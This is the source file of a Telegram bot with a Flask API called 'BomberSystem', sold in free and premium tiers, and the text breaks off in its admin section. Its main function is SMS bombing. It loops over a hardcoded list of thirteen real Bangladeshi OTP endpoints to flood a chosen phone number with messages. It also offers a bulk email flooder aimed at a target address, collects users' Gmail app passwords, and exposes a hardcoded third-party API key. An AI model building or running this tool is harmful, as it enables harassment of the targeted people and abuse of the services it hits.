"""
BomberSystem — Combined Flask API + Telegram Bot
Single file, single Render Web Service.
Flask runs in background thread, bot polls in main thread.
Start: gunicorn main:app --bind 0.0.0.0:$PORT --workers 1 --threads 4
"""

import os, re, time, uuid, json, string, random, smtplib, threading, requests
from datetime import datetime, date
from flask import Flask, request, jsonify
from flask_cors import CORS
import telebot
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, BotCommand
)

# ══════════════════════════════════════════════════════════════
# ENV
# ══════════════════════════════════════════════════════════════
BOT_TOKEN          = os.environ["BOT_TOKEN"]
ADMIN_IDS          = [int(x) for x in os.environ.get("ADMIN_IDS","").split(",") if x.strip()]
FIREBASE_URL       = os.environ["FIREBASE_URL"].rstrip("/")
BACKEND_SECRET     = os.environ["BACKEND_SECRET"]
CLOUDNEST_API_KEY  = os.environ.get("CLOUDNEST_API_KEY","cn_46df41f9832b438da28404d04c878367")
CLOUDNEST_BASE     = "https://cloudnest.pythonanywhere.com"
FREE_SMS_DAILY     = int(os.environ.get("FREE_SMS_DAILY","50"))
FREE_EMAIL_DAILY   = int(os.environ.get("FREE_EMAIL_DAILY","200"))
CONTACT_TG         = os.environ.get("CONTACT_TG","@admin")
FREE_SENDER_EMAIL  = os.environ.get("FREE_SENDER_EMAIL","")
FREE_SENDER_PASS   = os.environ.get("FREE_SENDER_PASS","")

# ══════════════════════════════════════════════════════════════
# FLASK APP
# ══════════════════════════════════════════════════════════════
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

@app.after_request
def add_cors(response):
    response.headers["Access-Control-Allow-Origin"]  = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type,Authorization,X-Api-Key"
    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return response

@app.route("/", defaults={"path": ""}, methods=["OPTIONS"])
@app.route("/<path:path>", methods=["OPTIONS"])
def handle_options(path):
    return jsonify({}), 200

# ══════════════════════════════════════════════════════════════
# TELEGRAM BOT
# ══════════════════════════════════════════════════════════════
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# ══════════════════════════════════════════════════════════════
# IN-MEMORY STATE
# ══════════════════════════════════════════════════════════════
user_state = {}
bombing    = {}
seen_otps  = {}

# ══════════════════════════════════════════════════════════════
# FIREBASE HELPERS
# ══════════════════════════════════════════════════════════════
def _fb(p): return f"{FIREBASE_URL}/{p}.json"

def fb_get(p):
    try:
        r = requests.get(_fb(p), timeout=10)
        return r.json() if r.status_code == 200 else None
    except: return None

def fb_set(p, d):
    try: requests.put(_fb(p), json=d, timeout=10)
    except: pass

def fb_push(p, d):
    try:
        r = requests.post(_fb(p), json=d, timeout=10)
        return r.json().get("name")
    except: return None

def sanitize(k): return re.sub(r'[.#$\[\]/]','_',str(k))

# ══════════════════════════════════════════════════════════════
# CLOUDNEST
# ══════════════════════════════════════════════════════════════
def cn_send_otp(email):
    try:
        r = requests.post(f"{CLOUDNEST_BASE}/api/otp/send",
            json={"api_key": CLOUDNEST_API_KEY, "email": email}, timeout=15)
        return r.json() if r.status_code == 200 else {"ok": False, "error": r.text}
    except Exception as e: return {"ok": False, "error": str(e)}

def cn_verify_otp(email, otp):
    try:
        r = requests.post(f"{CLOUDNEST_BASE}/api/otp/verify",
            json={"api_key": CLOUDNEST_API_KEY, "email": email, "otp": otp}, timeout=15)
        return r.json() if r.status_code == 200 else {"ok": False, "error": r.text}
    except Exception as e: return {"ok": False, "error": str(e)}

# ══════════════════════════════════════════════════════════════
# TEMP MAIL  (mail.tm + mail.gw fallback)
# ══════════════════════════════════════════════════════════════
MAIL_BASES = ["https://api.mail.tm", "https://api.mail.gw"]

def _gwtm_create(base, custom=None):
    try:
        r = requests.get(f"{base}/domains", timeout=10)
        if r.status_code != 200: return None
        domains = r.json().get("hydra:member", [])
        if not domains: return None
        domain = domains[0]["domain"]
        local  = custom if custom else ''.join(random.choices(string.ascii_lowercase+string.digits, k=12))
        addr   = f"{local}@{domain}"
        pwd    = ''.join(random.choices(string.ascii_letters+string.digits, k=14))
        r2 = requests.post(f"{base}/accounts",
            json={"address": addr, "password": pwd},
            headers={"Content-Type":"application/json"}, timeout=10)
        if r2.status_code not in (200,201): return None
        r3 = requests.post(f"{base}/token",
            json={"address": addr, "password": pwd},
            headers={"Content-Type":"application/json"}, timeout=10)
        if r3.status_code != 200: return None
        token = r3.json().get("token")
        return {"email": addr, "token": token, "base": base} if token else None
    except: return None

def create_temp_mail(custom=None):
    for base in MAIL_BASES:
        r = _gwtm_create(base, custom)
        if r: return r
    return None

def fetch_inbox(token, base):
    hdrs = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
    try:
        r = requests.get(f"{base}/messages", headers=hdrs, timeout=15)
        if r.status_code != 200: return []
        raw = r.json()
        metas = raw.get("hydra:member", raw.get("messages",[])) if isinstance(raw,dict) else raw
        out = []
        for m in metas[:5]:
            if not isinstance(m, dict): continue
            mid  = m.get("id") or m.get("@id","")
            subj = m.get("subject","")
            frm  = m.get("from",{})
            frm_addr = frm.get("address",str(frm)) if isinstance(frm,dict) else str(frm)
            ts   = m.get("createdAt","")
            body = ""
            try:
                r2 = requests.get(f"{base}/messages/{mid}", headers=hdrs, timeout=10)
                if r2.status_code == 200:
                    body = r2.json().get("text","") or r2.json().get("html","")
            except: pass
            out.append({"id":str(mid),"from":frm_addr,"subject":subj,"body":body,"time":ts})
        return out
    except: return []

# ══════════════════════════════════════════════════════════════
# SMS API LIST
# ══════════════════════════════════════════════════════════════
def get_sms_apis(number):
    raw = re.sub(r'\D','',number)
    if raw.startswith('880'):   raw=raw[3:]
    elif raw.startswith('88'):  raw=raw[2:]
    elif raw.startswith('0'):   raw=raw[1:]
    n0=f"0{raw}"; n88=f"88{n0}"; np88=f"+88{n0}"
    return [
        {"name":"Bioscope",     "method":"POST","url":"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en","json":{"number":np88}},
        {"name":"BTCL",         "method":"POST","url":"https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json","json":{"phoneNbr":n0,"email":"","OTPType":1,"userName":""}},
        {"name":"BD Tickets",   "method":"POST","url":"https://api.bdtickets.com:20100/v1/auth","json":{"createUserCheck":True,"phoneNumber":np88,"applicationChannel":"WEB_APP"}},
        {"name":"Apex4U",       "method":"POST","url":"https://api.apex4u.com/api/auth/login","json":{"phoneNumber":n0}},
        {"name":"Swap BD",      "method":"POST","url":"https://api.swap.com.bd/api/v1/send-otp/v2","json":{"phone":n0}},
        {"name":"Arogga",       "method":"POST","url":"https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome","data":{"mobile":n0,"fcmToken":"","referral":""}},
        {"name":"Fundesh",      "method":"POST","url":"https://fundesh.com.bd/api/auth/generateOTP?service_key=","json":{"msisdn":n0}},
        {"name":"Garibook",     "method":"POST","url":"https://api.garibookadmin.com/api/v3/user/login","json":{"mobile":n0,"recaptcha_token":"garibookcaptcha","channel":"web"}},
        {"name":"AppLink",      "method":"POST","url":"https://apps.applink.com.bd/appstore-v4-server/login/otp/request","json":{"msisdn":n88}},
        {"name":"Bikroy",       "method":"GET", "url":f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n0}"},
        {"name":"Ghoori Learn", "method":"POST","url":"https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web","json":{"mobile_no":n0}},
        {"name":"Deepto Play",  "method":"POST","url":"https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en","json":{"number":np88}},
        {"name":"GP Web",       "method":"POST","url":"https://webloginda.grameenphone.com/backend/api/v1/otp","data":{"msisdn":n0}},
    ]

# ══════════════════════════════════════════════════════════════
# USER HELPERS
# ══════════════════════════════════════════════════════════════
def get_user(cid):
    u = fb_get(f"users/{cid}")
    if not u:
        u = {"chat_id":cid,"email":None,"api_key":None,"premium":False,
             "sms_today":0,"email_today":0,"last_reset":str(date.today()),
             "total_sms":0,"total_email":0,"total_mail_bought":0}
        fb_set(f"users/{cid}", u)
    return u

def save_user(cid, u): fb_set(f"users/{cid}", u)

def reset_daily(u, cid):
    if u.get("last_reset") != str(date.today()):
        u["sms_today"]=0; u["email_today"]=0; u["last_reset"]=str(date.today())
        save_user(cid, u)
    return u

def is_admin(cid):  return int(cid) in ADMIN_IDS
def is_premium(u):  return u.get("premium",False) or is_admin(u.get("chat_id",0))
def gen_key():      return "bm_"+uuid.uuid4().hex

def check_api_key(key):
    users = fb_get("users") or {}
    for cid,u in users.items():
        if u.get("api_key")==key: return u,cid
    return None,None

# ══════════════════════════════════════════════════════════════
# KEYBOARDS
# ══════════════════════════════════════════════════════════════
MENU_TEXTS = {"📩 Send SMS","📧 Email Sender","📬 Temp Mail","📩 Get OTP",
              "📊 Status","🕒 History","⚙️ Project Settings","🔙 Back to Menu"}

def main_kb():
    m = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.row(KeyboardButton("📩 Send SMS"),  KeyboardButton("📧 Email Sender"))
    m.row(KeyboardButton("📬 Temp Mail"), KeyboardButton("📩 Get OTP"))
    m.row(KeyboardButton("📊 Status"),    KeyboardButton("🕒 History"))
    m.row(KeyboardButton("⚙️ Project Settings"))
    return m

def back_kb():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.row(KeyboardButton("🔙 Back to Menu"))
    return m

# ══════════════════════════════════════════════════════════════
# BOT COMMANDS SETUP
# ══════════════════════════════════════════════════════════════
try:
    bot.set_my_commands([
        BotCommand("start","শুরু করুন 🚀"),
        BotCommand("menu","মেনু 📋"),
        BotCommand("admin","Admin Panel 🛠"),
    ])
except: pass

# ══════════════════════════════════════════════════════════════
# START / AUTH
# ══════════════════════════════════════════════════════════════
def show_auth(cid):
    mk = InlineKeyboardMarkup()
    mk.row(InlineKeyboardButton("📝 Register",callback_data="auth_register"),
           InlineKeyboardButton("🔑 Login",   callback_data="auth_login"))
    bot.send_message(cid,
        "🔐 *BomberAPI Bot*\n\nস্বাগতম! শুরু করতে Register বা Login করুন।\n"
        "⚠️ শুধুমাত্র *Gmail* ব্যবহার করুন।", reply_markup=mk)

@bot.message_handler(commands=["start","menu"])
def cmd_start(msg):
    cid = msg.chat.id
    u   = get_user(cid)
    if u.get("email"):
        bot.send_message(cid, f"স্বাগতম! 👋\n📧 `{u['email']}`", reply_markup=main_kb())
    else:
        show_auth(cid)

@bot.callback_query_handler(func=lambda c: c.data in ("auth_register","auth_login"))
def cb_auth(call):
    cid = call.message.chat.id
    user_state[cid] = {"step": call.data}
    lbl = "Register" if call.data == "auth_register" else "Login"
    bot.edit_message_text(f"📧 *{lbl}*\n\nGmail অ্যাড্রেস লিখুন:", cid, call.message.message_id)

@bot.message_handler(func=lambda m: user_state.get(m.chat.id,{}).get("step") in ("auth_register","auth_login"))
def handle_email_input(msg):
    cid = msg.chat.id
    email_raw = (msg.text or "").strip().lower()
    if not re.fullmatch(r"[a-z0-9._%+\-]+@gmail\.com", email_raw) or "+" in email_raw:
        bot.send_message(cid,"❌ শুধু Gmail (@gmail.com), plus (+) চলবে না।"); return
    step   = user_state[cid]["step"]
    is_reg = step == "auth_register"
    exists = fb_get(f"emails/{sanitize(email_raw)}")
    if is_reg and exists:
        bot.send_message(cid,"❌ এই email আগেই রেজিস্টার্ড। Login করুন।"); user_state.pop(cid,None); return
    if not is_reg and not exists:
        bot.send_message(cid,"❌ এই email রেজিস্টার্ড নয়। Register করুন।"); user_state.pop(cid,None); return
    bot.send_message(cid,"⏳ OTP পাঠানো হচ্ছে...")
    res = cn_send_otp(email_raw)
    if not (res.get("ok") or res.get("message")):
        bot.send_message(cid,f"❌ OTP পাঠানো যায়নি: {res.get('error','unknown')}"); user_state.pop(cid,None); return
    user_state[cid] = {"step":"otp_verify","email":email_raw,"is_reg":is_reg}
    bot.send_message(cid,f"✅ `{email_raw}` এ OTP গেছে। এখন OTP দিন:")

@bot.message_handler(func=lambda m: user_state.get(m.chat.id,{}).get("step")=="otp_verify")
def handle_otp_verify(msg):
    cid   = msg.chat.id
    otp   = (msg.text or "").strip()
    state = user_state.get(cid,{})
    email_raw = state["email"]
    is_reg    = state["is_reg"]
    res = cn_verify_otp(email_raw, otp)
    if not (res.get("ok") or res.get("verified") or res.get("message")):
        bot.send_message(cid,"❌ OTP ভুল বা মেয়াদ শেষ।"); return
    u = get_user(cid)
    if is_reg:
        api_key    = gen_key()
        u["email"] = email_raw; u["api_key"] = api_key
        fb_set(f"emails/{sanitize(email_raw)}", {"chat_id":cid})
        save_user(cid,u)
        bot.send_message(cid,
            f"🎉 *Registration সফল!*\n\n📧 `{email_raw}`\n🔑 API Key: `{api_key}`\n\nKey টি সেভ করুন।",
            reply_markup=main_kb())
    else:
        u["email"] = email_raw; save_user(cid,u)
        bot.send_message(cid,
            f"✅ *Login সফল!*\n📧 `{email_raw}`\n🔑 API Key: `{u['api_key']}`",
            reply_markup=main_kb())
    user_state.pop(cid,None)

# ══════════════════════════════════════════════════════════════
# LOGIN GUARD
# ══════════════════════════════════════════════════════════════
def require_login(fn):
    def wrapper(msg_or_call, *a, **kw):
        cid = msg_or_call.chat.id if hasattr(msg_or_call,"chat") else msg_or_call.message.chat.id
        if not get_user(cid).get("email"): show_auth(cid); return
        return fn(msg_or_call,*a,**kw)
    wrapper.__name__ = fn.__name__; return wrapper

# ══════════════════════════════════════════════════════════════
# STATUS
# ══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text=="📊 Status")
@require_login
def handle_status(msg):
    cid = msg.chat.id; u = reset_daily(get_user(cid),cid)
    prem = "✅ Premium" if is_premium(u) else "🆓 Free"
    sl   = "∞" if is_premium(u) else str(FREE_SMS_DAILY)
    el   = "∞" if is_premium(u) else str(FREE_EMAIL_DAILY)
    bot.send_message(cid,
        f"📊 *Status*\n\n👤 Plan: {prem}\n"
        f"📩 SMS আজ: `{u.get('sms_today',0)}/{sl}`\n"
        f"📧 Email আজ: `{u.get('email_today',0)}/{el}`\n"
        f"📬 Mail কিনেছেন: `{u.get('total_mail_bought',0)}`\n\n"
        f"🔑 API Key: `{u.get('api_key','N/A')}`")

# ══════════════════════════════════════════════════════════════
# HISTORY
# ══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text=="🕒 History")
@require_login
def handle_history(msg):
    cid = msg.chat.id
    hist = fb_get(f"users/{cid}/mail_history") or {}
    items = list(hist.items()) if isinstance(hist,dict) else [(str(i),v) for i,v in enumerate(hist) if v]
    items = items[-10:]
    if not items: bot.send_message(cid,"📭 কোনো History নেই।"); return
    txt = "🕒 *Mail History:*\n\n"
    for _,v in items:
        if not isinstance(v,dict): continue
        txt += f"📧 `{v.get('email','—')}`\n🔑 `{v.get('token','—')}`\n🕒 {v.get('time','—')}\n➖➖➖\n"
    try: bot.send_message(cid,txt)
    except: bot.send_message(cid,"❌ History লোড সমস্যা।")

# ══════════════════════════════════════════════════════════════
# PROJECT SETTINGS
# ══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text=="⚙️ Project Settings")
@require_login
def handle_settings(msg):
    cid = msg.chat.id
    mk  = InlineKeyboardMarkup(row_width=1)
    mk.add(
        InlineKeyboardButton("📬 Temp Mail API Docs", callback_data="docs_tempmail"),
        InlineKeyboardButton("📩 SMS API Docs",       callback_data="docs_sms"),
        InlineKeyboardButton("📧 Email API Docs",     callback_data="docs_email"),
        InlineKeyboardButton("🔑 My API Key",         callback_data="docs_apikey"),
    )
    bot.send_message(cid,"⚙️ *Project Settings*\n\nকোন Docs দেখবেন?",reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("docs_"))
def cb_docs(call):
    cid  = call.message.chat.id
    u    = get_user(cid)
    key  = u.get("api_key","YOUR_API_KEY")
    # Self URL — Render sets RENDER_EXTERNAL_URL automatically
    base = os.environ.get("RENDER_EXTERNAL_URL","https://your-app.onrender.com")

    if call.data == "docs_apikey":
        bot.answer_callback_query(call.id)
        bot.send_message(cid,f"🔑 *API Key:*\n\n`{key}`"); return

    if call.data == "docs_tempmail":
        code = (f"import requests\nBASE='{base}'\nKEY='{key}'\n\n"
                f"# Mail তৈরি\nr=requests.post(BASE+'/mail/create',json={{'api_key':KEY}})\nd=r.json()  # d['email'], d['token'], d['base']\n\n"
                f"# OTP চেক\nr=requests.post(BASE+'/mail/inbox',\n    json={{'api_key':KEY,'token':d['token'],'base':d['base']}})\nprint(r.json()['messages'])\n\n"
                f"# Custom address\nr=requests.post(BASE+'/mail/create',json={{'api_key':KEY,'custom':'myname'}})")
    elif call.data == "docs_sms":
        code = (f"import requests\nBASE='{base}'\nKEY='{key}'\n\n"
                f"r=requests.post(BASE+'/sms/send',\n    json={{'api_key':KEY,'number':'01XXXXXXXXX'}})\nprint(r.json())\n"
                f"# Free: {FREE_SMS_DAILY}/day  |  Premium: unlimited → {CONTACT_TG}")
    elif call.data == "docs_email":
        code = (f"import requests\nBASE='{base}'\nKEY='{key}'\n\n"
                f"r=requests.post(BASE+'/email/send',\n    json={{\n"
                f"        'api_key':KEY,\n        'to':'target@example.com',\n"
                f"        'subject':'Hello',\n        'body':'Test',\n        'count':5,\n"
                f"        # 'from_email':'you@gmail.com',  # optional\n"
                f"        # 'from_pass':'app_password'     # optional\n    }})\nprint(r.json())\n"
                f"# Free: {FREE_EMAIL_DAILY}/day")

    bot.answer_callback_query(call.id)
    bot.send_message(cid,f"```python\n{code}\n```")

# ══════════════════════════════════════════════════════════════
# SMS BOMBER
# ══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text=="📩 Send SMS")
@require_login
def handle_sms(msg):
    cid  = msg.chat.id
    msg2 = bot.send_message(cid,"📱 টার্গেট নাম্বার দিন (01XXXXXXXXX):",reply_markup=back_kb())
    user_state[cid] = {"step":"sms_number"}
    bot.register_next_step_handler(msg2,_sms_got_number)

def _sms_got_number(msg):
    cid = msg.chat.id
    if msg.text in MENU_TEXTS or msg.text=="🔙 Back to Menu":
        user_state.pop(cid,None); bot.send_message(cid,"মেনু:",reply_markup=main_kb()); return
    number = (msg.text or "").strip()
    u = reset_daily(get_user(cid),cid)
    if not is_premium(u) and u.get("sms_today",0)>=FREE_SMS_DAILY:
        bot.send_message(cid,f"⚠️ আজকের লিমিট ({FREE_SMS_DAILY}) শেষ!\nPremium: {CONTACT_TG}",reply_markup=main_kb())
        user_state.pop(cid,None); return
    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton("🚀 Start Bombing",callback_data=f"bomb_start_{cid}"))
    user_state[cid] = {"step":"sms_ready","number":number}
    rem = FREE_SMS_DAILY-u.get("sms_today",0)
    bot.send_message(cid,
        f"🎯 Target: `{number}`\n📊 আজ আর {rem}টি SMS বাকি (free)\n\nShুরু করতে ক্লিক করুন:",
        reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("bomb_start_"))
def cb_bomb_start(call):
    cid = call.message.chat.id
    if bombing.get(cid): bot.answer_callback_query(call.id,"⚠️ ইতিমধ্যে চলছে!"); return
    number = user_state.get(cid,{}).get("number")
    if not number: bot.answer_callback_query(call.id,"❌ নাম্বার নেই।",show_alert=True); return
    u = reset_daily(get_user(cid),cid)
    if not is_premium(u) and u.get("sms_today",0)>=FREE_SMS_DAILY:
        bot.answer_callback_query(call.id,"❌ লিমিট শেষ!",show_alert=True); return
    bombing[cid]=True
    bot.answer_callback_query(call.id,"🚀 শুরু হচ্ছে...")
    mk=InlineKeyboardMarkup(); mk.add(InlineKeyboardButton("🛑 Stop",callback_data=f"bomb_stop_{cid}"))
    bot.edit_message_text(f"🔥 *SMS Bombing LIVE*\n📱 `{number}`\n⏳ শুরু হচ্ছে...",cid,call.message.message_id,reply_markup=mk)
    threading.Thread(target=_bomb_worker,args=(cid,call.message.message_id,number),daemon=True).start()

@bot.callback_query_handler(func=lambda c: c.data.startswith("bomb_stop_"))
def cb_bomb_stop(call):
    cid=call.message.chat.id; bombing[cid]=False
    bot.answer_callback_query(call.id,"🛑 বন্ধ হচ্ছে...")
    try: bot.edit_message_text("🛑 *Bombing বন্ধ।*",cid,call.message.message_id)
    except: pass

def _bomb_worker(cid,mid,number):
    u=get_user(cid); apis=get_sms_apis(number); logs=[]; sent=0; last_up=time.time()
    while bombing.get(cid,False):
        u=reset_daily(get_user(cid),cid)
        if not is_premium(u) and u.get("sms_today",0)>=FREE_SMS_DAILY:
            bombing[cid]=False
            try: bot.edit_message_text(f"⚠️ *লিমিট শেষ!* মোট {sent}টি গেছে।\nPremium: {CONTACT_TG}",cid,mid)
            except: pass; break
        for api in apis:
            if not bombing.get(cid,False): break
            try:
                hdrs={"User-Agent":"Mozilla/5.0","Accept":"application/json"}
                if api["method"]=="POST":
                    res=requests.post(api["url"],json=api.get("json"),data=api.get("data"),headers=hdrs,timeout=8)
                else:
                    res=requests.get(api["url"],headers=hdrs,timeout=8)
                if res.status_code in (200,201,202):
                    logs.append(f"✅ {api['name']}"); sent+=1
                    u["sms_today"]=u.get("sms_today",0)+1; u["total_sms"]=u.get("total_sms",0)+1
                    save_user(cid,u)
                else: logs.append(f"❌ {api['name']}")
            except: logs.append(f"⏭ {api['name']}")
            if time.time()-last_up>2.5:
                snippet="\n".join(logs[-6:]) or "⏳ Sending..."
                mk=InlineKeyboardMarkup(); mk.add(InlineKeyboardButton("🛑 Stop",callback_data=f"bomb_stop_{cid}"))
                try: bot.edit_message_text(f"🔥 *Bombing LIVE*\n📱 `{number}`\n✅ Sent:{sent}\n\n{snippet}",cid,mid,reply_markup=mk); last_up=time.time()
                except: pass
            time.sleep(0.8)
    try: bot.edit_message_text(f"✅ *Done.*\n📱 `{number}`\n📩 মোট: {sent}",cid,mid)
    except: pass
    bombing.pop(cid,None)

# ══════════════════════════════════════════════════════════════
# EMAIL SENDER
# ══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text=="📧 Email Sender")
@require_login
def handle_email_menu(msg):
    cid=msg.chat.id; u=reset_daily(get_user(cid),cid)
    if not is_premium(u) and u.get("email_today",0)>=FREE_EMAIL_DAILY:
        bot.send_message(cid,f"⚠️ Email লিমিট ({FREE_EMAIL_DAILY}) শেষ!\n{CONTACT_TG}",reply_markup=main_kb()); return
    mk=InlineKeyboardMarkup()
    mk.row(InlineKeyboardButton("🆓 Free Mail",callback_data="em_free"),
           InlineKeyboardButton("🛠 Custom Mail",callback_data="em_custom"))
    bot.send_message(cid,"📧 *Email Sender*\n\nঅপশন বেছে নিন:",reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data in ("em_free","em_custom"))
def cb_email_mode(call):
    cid=call.message.chat.id; mode=call.data
    user_state[cid]={"step":"email_flow","mode":mode}
    bot.edit_message_text("শুরু হচ্ছে...",cid,call.message.message_id)
    if mode=="em_custom": _ask_email_step(cid,"email_custom_from")
    else: _ask_email_step(cid,"email_target")

def _ask_email_step(cid,step):
    prompts={"email_custom_from":"📧 আপনার Gmail:","email_custom_pass":"🔑 App Password:","email_target":"📨 Target Email:","email_subject":"📝 Subject:","email_body":"📄 Body:","email_count":f"🔢 কতটি? (1–{FREE_EMAIL_DAILY}):"}
    user_state[cid]["sub_step"]=step
    msg=bot.send_message(cid,prompts[step],reply_markup=back_kb())
    bot.register_next_step_handler(msg,_email_step)

def _email_step(msg):
    cid=msg.chat.id; text=(msg.text or "").strip()
    if text in MENU_TEXTS or text=="🔙 Back to Menu":
        user_state.pop(cid,None); bot.send_message(cid,"মেনু:",reply_markup=main_kb()); return
    state=user_state.get(cid,{}); step=state.get("sub_step")
    if step=="email_custom_from":   state["from_email"]=text; _ask_email_step(cid,"email_custom_pass")
    elif step=="email_custom_pass": state["from_pass"]=text;  _ask_email_step(cid,"email_target")
    elif step=="email_target":      state["to"]=text;         _ask_email_step(cid,"email_subject")
    elif step=="email_subject":     state["subject"]=text;    _ask_email_step(cid,"email_body")
    elif step=="email_body":        state["body"]=text;       _ask_email_step(cid,"email_count")
    elif step=="email_count":
        try: count=max(1,min(int(text),FREE_EMAIL_DAILY))
        except: bot.send_message(cid,"❌ সংখ্যা দিন।"); _ask_email_step(cid,"email_count"); return
        state["count"]=count; _do_send_emails(cid,state); user_state.pop(cid,None)

def _do_send_emails(cid,state):
    mode=state.get("mode"); to=state["to"]; subject=state["subject"]; body=state["body"]; count=state["count"]
    fe=FREE_SENDER_EMAIL if mode=="em_free" else state.get("from_email","")
    fp=FREE_SENDER_PASS  if mode=="em_free" else state.get("from_pass","")
    if not fe or not fp: bot.send_message(cid,"❌ Email credentials নেই।",reply_markup=main_kb()); return
    prog=bot.send_message(cid,f"⏳ Sending 0/{count}..."); u=get_user(cid)
    try:
        srv=smtplib.SMTP("smtp.gmail.com",587); srv.ehlo(); srv.starttls(); srv.login(fe,fp)
        for i in range(count):
            srv.sendmail(fe,to,f"From:{fe}\nTo:{to}\nSubject:{subject}\n\n{body}")
            bot.edit_message_text(f"⏳ Sent:{i+1}/{count}",cid,prog.message_id)
            u["email_today"]=u.get("email_today",0)+1; u["total_email"]=u.get("total_email",0)+1
            save_user(cid,u); time.sleep(0.4)
        srv.quit(); bot.send_message(cid,f"🎉 {count}টি Email পাঠানো হয়েছে!",reply_markup=main_kb())
    except Exception as e: bot.send_message(cid,f"❌ Error: `{e}`",reply_markup=main_kb())

# ══════════════════════════════════════════════════════════════
# TEMP MAIL (BOT SIDE)
# ══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text=="📬 Temp Mail")
@require_login
def handle_tempmail(msg):
    cid=msg.chat.id
    mk=InlineKeyboardMarkup(row_width=1)
    mk.add(InlineKeyboardButton("🎲 Random Mail",callback_data="tm_random"),
           InlineKeyboardButton("✏️ Custom Mail",callback_data="tm_custom"))
    bot.send_message(cid,"📬 *Temp Mail*\n\nকীভাবে তৈরি করবেন?",reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data in ("tm_random","tm_custom"))
def cb_tempmail(call):
    cid=call.message.chat.id
    if call.data=="tm_random":
        bot.edit_message_text("⏳ তৈরি হচ্ছে...",cid,call.message.message_id)
        _create_show_mail(cid,None)
    else:
        user_state[cid]={"step":"tm_custom_name"}
        bot.edit_message_text("✏️ কাস্টম নাম দিন (a-z, 0-9 only):",cid,call.message.message_id)

@bot.message_handler(func=lambda m: user_state.get(m.chat.id,{}).get("step")=="tm_custom_name")
def handle_custom_name(msg):
    cid=msg.chat.id
    name=re.sub(r'[^a-z0-9]','',msg.text.lower()) if msg.text else ""
    if not name: bot.send_message(cid,"❌ শুধু a-z, 0-9 দিন।"); return
    user_state.pop(cid,None); bot.send_message(cid,"⏳ তৈরি হচ্ছে...")
    _create_show_mail(cid,name)

def _create_show_mail(cid,custom):
    result=create_temp_mail(custom)
    if not result: bot.send_message(cid,"❌ Mail তৈরি ব্যর্থ। আবার চেষ্টা করুন।",reply_markup=main_kb()); return
    email_addr=result["email"]; token=result["token"]; base=result["base"]
    fb_push(f"users/{cid}/mail_history",{"email":email_addr,"token":token,"base":base,"time":datetime.now().strftime("%Y-%m-%d %H:%M")})
    u=get_user(cid); u["total_mail_bought"]=u.get("total_mail_bought",0)+1; save_user(cid,u)
    mk=InlineKeyboardMarkup()
    # embed base in callback so OTP check knows which API to call
    safe_base=base.replace("https://api.","")  # "mail.tm" or "mail.gw"
    mk.add(InlineKeyboardButton("📩 OTP চেক",callback_data=f"otpc_{safe_base}_{token[:40]}"))
    bot.send_message(cid,
        f"✅ *Temp Mail তৈরি!*\n\n📧 `{email_addr}`\n🔑 `{token}`\n\nOTP চেক করতে ক্লিক করুন:",
        reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("otpc_"))
def cb_otp_check(call):
    cid=call.message.chat.id; parts=call.data.split("_",2)
    # parts[1] = "mail.tm" or "mail.gw",  parts[2] = token (possibly truncated)
    base_short=parts[1] if len(parts)>1 else "mail.tm"
    token=parts[2] if len(parts)>2 else ""
    base=f"https://api.{base_short}"
    # try to find full token from history
    hist=fb_get(f"users/{cid}/mail_history") or {}
    items=list(hist.values()) if isinstance(hist,dict) else hist
    full_token=token
    for it in items:
        if isinstance(it,dict) and it.get("token","").startswith(token):
            full_token=it["token"]; base=it.get("base",base); break
    bot.answer_callback_query(call.id,"⏳ চেক হচ্ছে...")
    _show_otp(cid,full_token,base)

@bot.message_handler(func=lambda m: m.text=="📩 Get OTP")
@require_login
def handle_get_otp(msg):
    cid=msg.chat.id
    msg2=bot.send_message(cid,"🔑 Mail Token লিখুন:",reply_markup=back_kb())
    user_state[cid]={"step":"otp_token_input"}
    bot.register_next_step_handler(msg2,_otp_got_token)

def _otp_got_token(msg):
    cid=msg.chat.id
    if msg.text in MENU_TEXTS or msg.text=="🔙 Back to Menu":
        user_state.pop(cid,None); bot.send_message(cid,"মেনু:",reply_markup=main_kb()); return
    token=(msg.text or "").strip(); user_state.pop(cid,None)
    _show_otp(cid,token,"https://api.mail.tm")

def _show_otp(cid,token,base):
    msgs=fetch_inbox(token,base)
    if not msgs:
        # try other base as fallback
        other="https://api.mail.gw" if "mail.tm" in base else "https://api.mail.tm"
        msgs=fetch_inbox(token,other)
    if not msgs: bot.send_message(cid,"📭 ইনবক্স খালি।"); return
    for m in msgs[:3]:
        otp=re.search(r"\b\d{4,8}\b",m.get("subject","")+m.get("body",""))
        code=otp.group(0) if otp else "No Code Found"
        bot.send_message(cid,f"🏢 From: `{m.get('from','?')}`\n🔢 Code: *{code}*\n📋 {m.get('subject','—')}\n🕒 {m.get('time','?')}")

# ══════════════════════════════════════════════════════════════
# ADMIN
# ══════════════════════════════════════════════════════════════
@bot.message_handler(commands=["admin"])
def cmd_admin(msg):
    if not is_admin(msg.chat.id): return
    mk=InlineKeyboardMarkup(row_width=1)
